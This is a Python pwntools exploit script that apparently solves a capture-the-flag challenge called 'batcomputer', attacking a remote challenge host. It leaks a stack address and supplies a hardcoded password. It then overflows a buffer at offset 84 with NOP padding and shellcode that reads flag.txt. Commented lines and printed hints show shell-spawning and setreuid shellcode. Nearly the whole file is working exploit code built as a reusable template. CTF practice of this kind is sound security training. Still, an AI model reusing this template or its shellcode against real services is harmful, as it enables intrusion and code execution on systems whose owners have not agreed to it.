from pwn import *
import time
import re

# Built from and inspired by:
# https://notes.vulndev.io/wiki/redteam/templates
# 

context.terminal = ['tmux', 'new-window']
target = './batcomputer'
context.binary = target
context.log_level = 'info' # info, debug will print flag in table with addresses,hex and translated ASCII with columns
binary = ELF(target)

rhost = '94.237.49.166' 
rport = 36173 

gdbscript = '''
continue
'''.format(**locals())
# NOASLR

# Get addresses - CryptoCat for p and r
# recvS() is like recv(), but returns a String 
# recvlineS() 
# recvline() -> bytes and is faster btw!
#pivot_addr = int(re.search(r"(0x[\w\d]+)", r.recvS()).group(0), 16)
#pivot_addr = int(re.search(r"(0x[\w\d]+)", p.recvS()).group(0), 16)
#info("pivot_addr: %#x", pivot_addr)

# Extract value after string
#get = lambda x: [sh.recvuntil('{} : '.format(x)), int(sh.recvline())][1]
#p = get('p')

# LD_Preload in pwntool
#libc = ELF(<name>)
#main = ELF(<name>)
#r = main.process(env={'LD_PRELOAD' : libc.path})

# SSH connection variables
ssh_host = '10.10.10.10'
ssh_user = '!'
sh_pass = '!'
ssh_port = 22

joker_location = b""
password = f"b4tp@$$w0rd!"


def find_eip(payload):
    p = process(binary)
    p.sendlineafter('>', payload)
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc) # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
    info('Located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# offset = find_eip(cyclic(1000))
offset = 84

#
# payload = flat({offset: stack_addr})
# payload = flat([padding, shellcode, stack_addr])

shellcode = asm(shellcraft.popad()) # Pop all of the registers !!onto!! the stack in same order 
#shellcode += asm(shellcraft.amd64.linux.sh())
shellcode += asm(shellcraft.amd64.linux.cat('flag.txt'))
padding = asm('nop') * (offset - len(shellcode))
info("Compiled shellcode length: %#x", len(shellcode))
info("Compiled paddinglength: %#x", len(padding))

# Write payload to file
# write('payload-pwn', payload)


if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout='2')
    p.sendline(target)
elif args['REMOTE']:
    r = remote(rhost, rport) 
    r.sendlineafter('>', '1')
    stack_addr = int(re.search(r"(0x[\w\d]+)", r.recvlineS()).group(0), 16)
    info("stack address: %#x", stack_addr)
    r.sendlineafter('>', '2') 
    r.sendlineafter("Enter the password:", password) 
    payload = flat([padding, shellcode, stack_addr])
    r.sendlineafter("Enter the navigation commands:", payload) 
    r.sendlineafter('>', '420')
    r.recvuntil("Too bad, now who's gonna save Gotham? Alfred?\n")
    flag = r.recv()
    success(flag)
    r.close()
elif args['GEF']:
    p = process(target,setuid=True)
    gdb.attach(p, gdbscript=gdbscript)
    p.sendlineafter('>', '1')
    stack_addr = int(re.search(r"(0x[\w\d]+)", p.recvlineS()).group(0), 16)
    info("stack address: %#x", stack_addr)
    p.sendlineafter('>', '2')
    p.sendlineafter("Enter the password:", password) 
    payload = flat([padding, shellcode, stack_addr])
    p.sendlineafter("Enter the navigation commands:", payload) 
    p.sendlineafter('>', '420')
    p.recvuntil("Too bad, now who's gonna save Gotham? Alfred?\n")
    flag = p.recv()
    success(flag)
    p.close()
else: 
    print("Vim search and replace: \%\s/SomeRecieveStringHere/ /g")
    print("Vim search and replace: \%\s/>/ /g")
    print("Generate shellcode on the commandline: `pwn shellcraft -f d amd64.linux.setreuid 1002`")

# p.interactive()


